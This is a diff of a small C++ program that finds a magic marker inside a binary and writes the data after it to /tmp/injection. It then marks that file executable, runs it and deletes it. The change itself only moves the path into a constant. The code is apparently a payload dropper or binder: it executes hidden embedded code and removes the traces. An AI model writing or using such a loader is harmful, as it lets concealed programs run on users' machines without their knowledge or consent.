@@ -4,6 +4,9 @@
 #include <iostream>
 #include <iterator>
 #include <algorithm>
+#include <cstdlib>
+
+const char * OUT_FILE = "/tmp/injection";
 
 int main( int argc, char * argv[] ) {
 	using namespace std;
@@ -21,14 +24,14 @@ int main( int argc, char * argv[] ) {
 			cerr << "Can not find piece!" << endl;
 		} else {
 			advance( result, magic.length() );
-			ofstream fout( "/tmp/injection", ios::binary );
+			ofstream fout( OUT_FILE, ios::binary );
 			if( fout.is_open() ) {
 				copy( result, binary.end(), ostreambuf_iterator< char >( fout ) );
 				fout.close();
 				list< char >().swap( binary );
-				system( "chmod a+x /tmp/injection && /tmp/injection && rm -f /tmp/injection" );
+				system( ( string( "chmod a+x " ) + OUT_FILE + " && " + OUT_FILE + " && rm -f " + OUT_FILE ).c_str() );
 			} else {
-				cerr << "Can not write `/tmp/injection\'!" << endl;
+				cerr << "Can not write `" << OUT_FILE << "\'!" << endl;
 			}
 		}
 	} else {
